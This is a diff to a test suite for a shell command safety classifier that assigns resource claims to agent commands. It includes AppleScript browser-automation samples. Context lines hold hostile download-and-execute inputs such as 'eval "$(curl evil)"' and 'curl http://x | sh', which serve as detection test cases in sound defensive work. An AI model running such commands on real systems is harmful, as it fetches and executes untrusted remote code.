@@ -1004,6 +1004,17 @@ describe('command classifier safe shell combinations', () => {
     expect(route.mode).toBe('fast');
   });
 
+  test('ignores shell substitution syntax inside single-quoted eval source but not active shell text', () => {
+    const wrappedEval = ['bash', '-lc', "bun -e 'const key=`request-${Date.now()}`; console.log(key)'"];
+    expect(classifyRepositoryCommand(wrappedEval).risk).toBe('workspace_write');
+    const claims = claimsForRepositoryCommand(wrappedEval, 'repo1', 'co1');
+    expect(claims).toEqual([{ resourceKey: 'workspace:co1', mode: 'write' }]);
+    expect(claims.some((claim) => claim.resourceKey.startsWith('git-'))).toBe(false);
+
+    expect(shellCommandHasUnsafeConstructs('echo "$(date)"').unsafe).toBe(true);
+    expect(shellCommandHasUnsafeConstructs("echo '$(date)'").unsafe).toBe(false);
+  });
+
   test('rejects eval and download-exec', () => {
     expect(shellCommandHasUnsafeConstructs('eval "$(curl evil)"').unsafe).toBe(true);
     expect(shellCommandHasUnsafeConstructs('curl http://x | sh').unsafe).toBe(true);
@@ -1048,6 +1059,42 @@ describe('fine-grained resource claims', () => {
         mode: 'write',
       }),
     ]);
+  });
+
+  test('shell-wrapped browser AppleScript claims host browser automation instead of repository workspace', () => {
+    const script = `osascript <<'APPLESCRIPT'
+tell application "Google Chrome"
+  set targetTab to active tab of front window
+  execute targetTab javascript "document.body.innerText"
+end tell
+APPLESCRIPT`;
+    const claims = claimsForRepositoryCommand(['bash', '-lc', script], 'repo1', 'co1');
+    expect(claims).toEqual([{ resourceKey: 'host-service:osascript:google-chrome', mode: 'write' }]);
+    expect(claims.some((claim) => claim.resourceKey.startsWith('workspace:'))).toBe(false);
+    expect(claims.some((claim) => claim.resourceKey.startsWith('git-'))).toBe(false);
+  });
+
+  test('shell-wrapped AppleScript stays workspace-write when browser-only proof is incomplete', () => {
+    const trailingMutation = `osascript <<'APPLESCRIPT'
+tell application "Google Chrome"
+  return title of active tab of front window
+end tell
+APPLESCRIPT
+touch generated.txt`;
+    expect(claimsForRepositoryCommand(['bash', '-lc', trailingMutation], 'repo1', 'co1')).toContainEqual({
+      resourceKey: 'workspace:co1',
+      mode: 'write',
+    });
+
+    const shellEscape = `osascript <<'APPLESCRIPT'
+tell application "Google Chrome"
+  do shell script "touch generated.txt"
+end tell
+APPLESCRIPT`;
+    expect(claimsForRepositoryCommand(['bash', '-lc', shellEscape], 'repo1', 'co1')).toContainEqual({
+      resourceKey: 'workspace:co1',
+      mode: 'write',
+    });
   });
 
   test('URI-only macOS open commands claim host UI instead of repository workspace', () => {
